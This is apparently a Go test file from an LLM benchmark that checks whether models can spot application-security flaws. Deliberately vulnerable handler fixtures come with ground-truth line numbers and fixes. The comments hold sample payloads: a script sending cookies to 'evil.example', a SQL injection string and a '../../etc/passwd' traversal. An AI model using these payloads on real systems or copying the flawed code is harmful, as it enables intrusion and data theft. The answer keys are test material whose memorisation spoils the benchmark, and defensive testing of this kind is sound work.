package tests

import (
	"context"
	"regexp"

	"github.com/lukaszraczylo/llm-testbench/internal/eval"
	"github.com/lukaszraczylo/llm-testbench/internal/testkit"
)

func registerSecurityAppsecTests(r *testkit.Registry) {
	r.Register(secSQLiSpotTest())
	r.Register(secXSSSinkSpotTest())
	r.Register(secPathTraversalSpotTest())
	r.Register(secSSRFSpotTest())
	r.Register(secIDORSpotTest())
	r.Register(secOpenRedirectSpotTest())
	r.Register(secCSRFRequirementTest())
	r.Register(secRateLimitPlacementTest())
	r.Register(secInputValidationBoundaryTest())
	r.Register(secSecretLogSpotTest())
}

// secSQLiFixture is a synthetic, never-compiled Go handler (FIXTURE:
// referenced only from this string literal, never as real source) used as
// the line-numbered prompt body for secSQLiSpotTest. Each displayed line is
// prefixed with its 1-based position in this listing.
const secSQLiFixture = `1: func LookupUser(db *sql.DB, username string) (*User, error) {
2:     query := "SELECT id, email FROM users WHERE username = '" + username + "'"
3:     row := db.QueryRow(query)
4:     var u User
5:     if err := row.Scan(&u.ID, &u.Email); err != nil {
6:         return nil, err
7:     }
8:     return &u, nil
9: }`

// secSQLiSpotTest: spot a SQL injection built by string-concatenating an
// unsanitized parameter into a query, and require the parameterized-query
// fix.
//
// ground truth: line 2 concatenates the caller-supplied username directly
// into the SQL text. A username of `' OR '1'='1` closes the quoted literal
// early and turns the WHERE clause into an always-true condition, returning
// every row instead of one user. The fix is a parameterized query (a
// placeholder plus separately-passed args), not string concatenation.
func secSQLiSpotTest() testkit.Test {
	prompt := `Here is a Go database handler. Each displayed line is prefixed
with its 1-based position in this listing:

` + secSQLiFixture + `

Which line number introduces a SQL injection vulnerability, and what
category of fix addresses it? Respond with only a JSON object:
{"line":<number>,"fix":"<one of: parameterized-query, escape-output, add-waf>"}`

	evaluator := eval.Mean(
		eval.JSONField("line", 2),
		eval.JSONField("fix", "parameterized-query"),
	)

	return testkit.Test{
		ID:          "sec-sqli-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot a SQL injection built by string-concatenating a caller-supplied value into a query, and require the parameterized-query fix.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secXSSFixture is a synthetic Go HTTP handler (FIXTURE: prompt-only, never
// compiled) for secXSSSinkSpotTest.
const secXSSFixture = `1: func Greet(w http.ResponseWriter, r *http.Request) {
2:     name := r.URL.Query().Get("name")
3:     w.Header().Set("Content-Type", "text/html")
4:     fmt.Fprintf(w, "<h1>Welcome, %s!</h1>", name)
5: }`

// secXSSSinkSpotTest: spot a reflected-XSS sink where a query parameter is
// written into an HTML response with no escaping.
//
// ground truth: line 4 writes the caller-supplied name straight into the
// HTML body with fmt.Fprintf, which does no HTML escaping. A name of
// `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`
// executes in the victim's browser. The fix is to HTML-escape the value
// before writing it (or render through html/template, which auto-escapes),
// not to validate input shape or add a Content-Security-Policy as the
// primary fix for an already-unescaped sink.
func secXSSSinkSpotTest() testkit.Test {
	prompt := `Here is a Go HTTP handler. Each displayed line is prefixed with
its 1-based position in this listing:

` + secXSSFixture + `

Which line number is the reflected-XSS sink, and what category of fix
addresses it? Respond with only a JSON object:
{"line":<number>,"fix":"<one of: escape-output, validate-input, add-csp>"}`

	evaluator := eval.Mean(
		eval.JSONField("line", 4),
		eval.JSONField("fix", "escape-output"),
	)

	return testkit.Test{
		ID:          "sec-xss-sink-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot a reflected-XSS sink writing an unescaped query parameter into an HTML response.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secPathTraversalFixture is a synthetic Go HTTP handler (FIXTURE:
// prompt-only, never compiled) for secPathTraversalSpotTest.
const secPathTraversalFixture = `1: func ServeReport(w http.ResponseWriter, r *http.Request) {
2:     name := r.URL.Query().Get("file")
3:     path := "/var/reports/" + name
4:     data, err := os.ReadFile(path)
5:     if err != nil {
6:         http.Error(w, "not found", http.StatusNotFound)
7:         return
8:     }
9:     w.Write(data)
10: }`

// secPathTraversalSpotTest: spot a path-traversal vulnerability where a
// query parameter is concatenated onto a base directory with no cleaning.
//
// ground truth: line 3 concatenates the caller-supplied file parameter
// directly onto the base directory with no cleaning of ".." segments. A
// file value of `../../etc/passwd` escapes /var/reports/ entirely. The fix
// is to resolve and validate the final path stays inside the base
// directory (e.g. filepath.Clean plus a prefix check, or rejecting ".."),
// not to HTML-escape output or rate-limit the endpoint.
func secPathTraversalSpotTest() testkit.Test {
	prompt := `Here is a Go HTTP handler. Each displayed line is prefixed with
its 1-based position in this listing:

` + secPathTraversalFixture + `

Which line number builds the unsanitized filesystem path (concatenating a
caller-supplied value onto a base directory with no cleaning of ".."
segments), and what category of fix addresses it? Respond with only a JSON
object:
{"line":<number>,"fix":"<one of: sanitize-path, escape-output, rate-limit>"}`

	evaluator := eval.Mean(
		eval.JSONField("line", 3),
		eval.JSONField("fix", "sanitize-path"),
	)

	return testkit.Test{
		ID:          "sec-path-traversal-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot a path traversal built by concatenating a caller-supplied filename onto a base directory with no cleaning.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secSSRFFixture is a synthetic Go HTTP handler (FIXTURE: prompt-only,
// never compiled) for secSSRFSpotTest.
const secSSRFFixture = `1: func FetchPreview(w http.ResponseWriter, r *http.Request) {
2:     target := r.URL.Query().Get("url")
3:     resp, err := http.Get(target)
4:     if err != nil {
5:         http.Error(w, "fetch failed", http.StatusBadGateway)
6:         return
7:     }
8:     defer resp.Body.Close()
9:     io.Copy(w, resp.Body)
10: }`

// secSSRFSpotTest: spot a server-side-request-forgery sink where the server
// fetches a fully attacker-controlled URL with no allowlist.
//
// ground truth: line 3 passes the caller-supplied target URL straight to an
// outbound HTTP GET performed by the server, with no allowlist or denylist.
// An attacker can point it at hosts the server can reach but the attacker
// cannot (an internal admin panel, a cloud metadata endpoint), turning the
// server into a proxy for internal network access. The fix is to allowlist
// the permitted hosts/schemes before fetching, not to sanitize a filesystem
// path or escape HTML output.
func secSSRFSpotTest() testkit.Test {
	prompt := `Here is a Go HTTP handler. Each displayed line is prefixed with
its 1-based position in this listing:

` + secSSRFFixture + `

Which line number introduces a server-side request forgery vulnerability,
and what category of fix addresses it? Respond with only a JSON object:
{"line":<number>,"fix":"<one of: allowlist-hosts, sanitize-path, escape-output>"}`

	evaluator := eval.Mean(
		eval.JSONField("line", 3),
		eval.JSONField("fix", "allowlist-hosts"),
	)

	return testkit.Test{
		ID:          "sec-ssrf-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot an SSRF sink where the server fetches a fully attacker-controlled URL with no host allowlist.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secIDORFixture is a synthetic Go HTTP handler (FIXTURE: prompt-only,
// never compiled) for secIDORSpotTest.
const secIDORFixture = `1: func GetInvoice(w http.ResponseWriter, r *http.Request) {
2:     userID := currentUser(r).ID
3:     invoiceID := r.URL.Query().Get("id")
4:     invoice, err := db.FindInvoice(invoiceID)
5:     if err != nil {
6:         http.Error(w, "not found", http.StatusNotFound)
7:         return
8:     }
9:     json.NewEncoder(w).Encode(invoice)
10: }`

// secIDORSpotTest: spot an insecure-direct-object-reference where an
// invoice is looked up by a client-supplied id with no ownership check.
//
// ground truth: line 4 fetches the invoice by the caller-supplied
// invoiceID alone. userID (line 2) is read but never compared against the
// fetched invoice's owner, so any logged-in user can read any other user's
// invoice by guessing or incrementing the id. The fix is to authorize the
// fetch against the requesting user's ownership, not to parameterize the
// query (it already is) or rate-limit the endpoint.
func secIDORSpotTest() testkit.Test {
	prompt := `Here is a Go HTTP handler. Each displayed line is prefixed with
its 1-based position in this listing:

` + secIDORFixture + `

Which line number performs a lookup that is missing an authorization check
(an insecure direct object reference), and what category of fix addresses
it? Respond with only a JSON object:
{"line":<number>,"fix":"<one of: authorize-owner, parameterized-query, rate-limit>"}`

	evaluator := eval.Mean(
		eval.JSONField("line", 4),
		eval.JSONField("fix", "authorize-owner"),
	)

	return testkit.Test{
		ID:          "sec-idor-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot an IDOR: an invoice fetched by a client-supplied id with the requesting user's ownership never checked.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secOpenRedirectFixture is a synthetic Go HTTP handler (FIXTURE:
// prompt-only, never compiled) for secOpenRedirectSpotTest.
const secOpenRedirectFixture = `1: func Login(w http.ResponseWriter, r *http.Request) {
2:     next := r.URL.Query().Get("next")
3:     // ... authenticate the user ...
4:     http.Redirect(w, r, next, http.StatusFound)
5: }`

// secOpenRedirectSpotTest: spot an open-redirect where a post-login
// destination is taken unvalidated from a query parameter.
//
// ground truth: line 4 redirects to the raw next parameter with no check
// that it points to this application's own host. An attacker can craft a
// login link with next=https://evil.example.com and redirect authenticated
// users off-site immediately after they log in.
func secOpenRedirectSpotTest() testkit.Test {
	prompt := `Here is a Go HTTP handler. Each displayed line is prefixed with
its 1-based position in this listing:

` + secOpenRedirectFixture + `

Which line number redirects to a caller-controlled destination with no
same-host check (an open redirect)? Respond with only a JSON object:
{"line":<number>}`

	return testkit.Test{
		ID:          "sec-open-redirect-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot an open redirect: a post-login destination taken unvalidated from a query parameter.",
		Prompt:      prompt,
		Eval:        eval.JSONField("line", 4),
	}
}

// secCSRFRequirementTest: decide whether an endpoint authenticated purely
// by a custom header bearer token (no cookies) needs CSRF protection.
//
// ground truth: CSRF exploits an ambient credential the browser attaches
// automatically to cross-site requests - a session cookie. A forged
// cross-site request cannot make the victim's browser attach a custom
// Authorization header on its own, so an endpoint authenticated only by a
// header-carried bearer token, with no cookie in the picture, has no
// ambient credential for a forged request to ride on and does not need a
// CSRF token.
func secCSRFRequirementTest() testkit.Test {
	prompt := `A POST /api/transfer endpoint moves money between accounts. It
is authenticated only by a bearer token read from a custom Authorization
header; the server sets no cookies at all, and nothing about this endpoint
causes a browser to attach that header automatically to a cross-site
request.

Does this endpoint need an explicit CSRF token/protection mechanism?
Respond with only one word: yes or no.`

	return testkit.Test{
		ID:          "sec-csrf-requirement",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Decide whether a header-bearer-token-only endpoint (no cookies) needs CSRF protection.",
		Prompt:      prompt,
		Eval:        eval.ExactToken("no"),
	}
}

// secRateLimitPlacementTest: decide the correct stage and keying for
// rate-limiting a login endpoint.
//
// ground truth: rate limiting must run before the expensive password check
// runs (as an outer gate), otherwise every brute-force attempt still pays
// the full bcrypt/argon2 cost and the limiter does nothing to stop resource
// exhaustion. Keying by IP alone lets one attacker rotate usernames from a
// fixed IP largely unthrottled per-account, and keying by account alone
// lets a distributed attacker (many IPs) brute-force one account
// unthrottled per-IP; keying by the (ip, account) pair catches both.
func secRateLimitPlacementTest() testkit.Test {
	prompt := `A login endpoint calls bcrypt.CompareHashAndPassword (a
deliberately slow, CPU-expensive check) to verify the submitted password
against the stored hash.

At which stage should rate limiting be enforced relative to the bcrypt
check, and how should the rate-limit key be constructed? Respond with only
a JSON object:
{"stage":"<one of: before-auth-check, after-auth-check>","key":"<one of: ip-and-account, ip-only, account-only>"}`

	evaluator := eval.Mean(
		eval.JSONField("stage", "before-auth-check"),
		eval.JSONField("key", "ip-and-account"),
	)

	return testkit.Test{
		ID:          "sec-rate-limit-placement",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Decide rate limiting must gate a login endpoint before the expensive password check, keyed by IP and account together.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secQuantityUpperBoundConcretePattern matches a concrete numeric
// upper-bound expression: an explicit min/max pair, or a numeric range like
// "1..10000" (CC3).
var secQuantityUpperBoundConcretePattern = regexp.MustCompile(`(?i)\d+\s*\.\.\s*\d+|\bmin(?:imum)?\b[^.\n]{0,20}\bmax(?:imum)?\b|\bmax(?:imum)?\b[^.\n]{0,20}\bmin(?:imum)?\b`)

// secQuantityUpperBoundEval scores full credit when the response either
// uses one of the generic upper-bound words ("maximum", "upper bound",
// "cap", "overflow", "too large", "excessively large", "unbounded") or
// states a concrete numeric bound expression instead (CC3).
func secQuantityUpperBoundEval() eval.Evaluator {
	words := eval.ContainsAny("maximum", "upper bound", "cap", "overflow", "too large", "excessively large", "unbounded")
	return eval.EvaluatorFunc(func(ctx context.Context, response string) eval.Score {
		if w := words.Evaluate(ctx, response); w.Value == 1 {
			return w
		}
		if secQuantityUpperBoundConcretePattern.MatchString(response) {
			return eval.Score{Value: 1, Detail: "matches a concrete numeric upper-bound expression"}
		}
		return eval.Score{Value: 0, Detail: "no upper-bound cue (generic word or concrete numeric bound) found"}
	})
}

// secInputValidationBoundaryTest: name the two numeric boundary checks
// missing from an unvalidated order-quantity field.
//
// ground truth: a zero or negative quantity lets an attacker construct a
// negative-total order line, effectively crediting themselves money; an
// unbounded huge quantity can overflow price*quantity arithmetic or let a
// single request attempt to reserve the entire inventory. Both a lower
// bound (reject <= 0) and an upper bound (reject/cap above a sane maximum)
// are required; either check alone leaves the other abuse path open.
func secInputValidationBoundaryTest() testkit.Test {
	prompt := `An order-checkout endpoint accepts a JSON body with a
"quantity" integer field for one line item. The handler does nothing but
json.Unmarshal it into an int before using it to compute
price * quantity and reserve that many units of inventory - no other
validation runs on it.

Name the two numeric boundary checks that must be added to quantity before
it is used, and why each one matters.`

	// CC3: the upper-bound group's plain words ("cap", "overflow") are
	// generic enough to plausibly appear in unrelated prose. A response
	// that instead states a concrete numeric bound (a min/max pair, or an
	// explicit range like "1..10000") is an equally valid, even more
	// specific answer, so it is accepted as an alternative alongside the
	// existing word list rather than only via those words.
	evaluator := eval.Mean(
		eval.ContainsAny("negative", "<= 0", "zero or negative", "greater than zero", "greater than 0", "positive"),
		secQuantityUpperBoundEval(),
	)

	return testkit.Test{
		ID:          "sec-input-validation-boundary",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Name the lower-bound and upper-bound numeric checks missing from an unvalidated order-quantity field.",
		Prompt:      prompt,
		Eval:        evaluator,
	}
}

// secSecretLogFixture is a synthetic Go HTTP handler (FIXTURE: prompt-only,
// never compiled) for secSecretLogSpotTest.
// #nosec G101 -- prompt-only fixture text, never compiled; it demonstrates a
// secret leaking into application logs, which is exactly the bug this test
// asks the model to spot.
const secSecretLogFixture = `1: func HandlePayment(w http.ResponseWriter, r *http.Request) {
2:     apiKey := r.Header.Get("X-API-Key")
3:     log.Printf("processing payment request: method=%s path=%s api_key=%s", r.Method, r.URL.Path, apiKey)
4:     result, err := chargeCard(r.Context(), apiKey)
5:     if err != nil {
6:         http.Error(w, "payment failed", http.StatusInternalServerError)
7:         return
8:     }
9:     json.NewEncoder(w).Encode(result)
10: }`

// secSecretLogSpotTest: spot a live secret written to plain-visibility
// application logs.
//
// ground truth: line 3 writes the raw apiKey straight into the application
// log at plain visibility. Anyone with log access - a log-aggregation SaaS,
// on-disk log rotation, a support engineer grepping logs - now has the live
// API key, independent of any access control on the API itself.
func secSecretLogSpotTest() testkit.Test {
	prompt := `Here is a Go HTTP handler. Each displayed line is prefixed with
its 1-based position in this listing:

` + secSecretLogFixture + `

Which line number writes a live secret into the application logs at plain
visibility? Respond with only a JSON object: {"line":<number>}`

	return testkit.Test{
		ID:          "sec-secret-log-spot",
		Category:    "security",
		Subcategory: "appsec",
		Description: "Spot a live API key written straight into application logs at plain visibility.",
		Prompt:      prompt,
		Eval:        eval.JSONField("line", 3),
	}
}
